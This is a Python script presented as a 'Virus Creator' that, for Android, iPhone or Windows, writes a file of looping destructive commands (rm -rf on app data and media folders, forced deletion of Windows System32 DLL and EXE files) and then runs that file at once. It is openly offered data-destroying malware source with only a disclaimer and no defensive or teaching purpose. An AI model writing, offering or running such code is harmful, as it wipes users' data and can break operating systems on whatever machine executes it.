python
import os
import sys
import time
from colorama import init, Fore

init(autoreset=True)

def print_red(text):
    print(Fore.RED + text)

def create_virus(device_type):
    if device_type.lower() == "android":
        virus_code = """
# Android Virus
import os
import time

def crash_device():
    while True:
        os.system('rm -rf /data/data/com.whatsapp')
        os.system('rm -rf /data/data/com.facebook.katana')
        os.system('rm -rf /data/data/com.google.android.gm')
        time.sleep(1)

crash_device()
"""
    elif device_type.lower() == "iphone":
        virus_code = """
# iPhone Virus
import os
import time

def crash_device():
    while True:
        os.system('rm -rf /private/var/mobile/Containers/Data/Application/')
        os.system('rm -rf /private/var/mobile/Media/')
        time.sleep(1)

crash_device()
"""
    elif device_type.lower() == "windows":
        virus_code = """
# Windows Virus
import os
import time

def crash_device():
    while True:
        os.system('del /f /q C:\\\\Windows\\\\System32\\\\*.dll')
        os.system('del /f /q C:\\\\Windows\\\\System32\\\\*.exe')
        time.sleep(1)

crash_device()
"""
    else:
        print_red("Unsupported device type.")
        return None

    return virus_code

def main():
    print_red("""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
█░█ █ █▀█ █░█ █▀   █▀█  ▄█
▀▄▀ █ █▀▄ █▄█ ▄█   █▄█  ░█   V1.0
    """)
    print_red("Welcome to the Virus Creator!")
    print_red("This script will create a virus for the specified device.")
    print_red("The virus will crash the device when executed.")
    print_red("Use at your own risk. I take no responsibility for any damage caused.")

    device_type = input("Enter the device type (Android, iPhone, Windows): ")

    virus_code = create_virus(device_type)

    if virus_code:
        with open("virus.py", "w") as f:
            f.write(virus_code)
        print_red("Virus created successfully as virus.py")
        print_red("Executing the virus...")
        os.system('python virus.py')

if __name__ == "__main__":
    main()
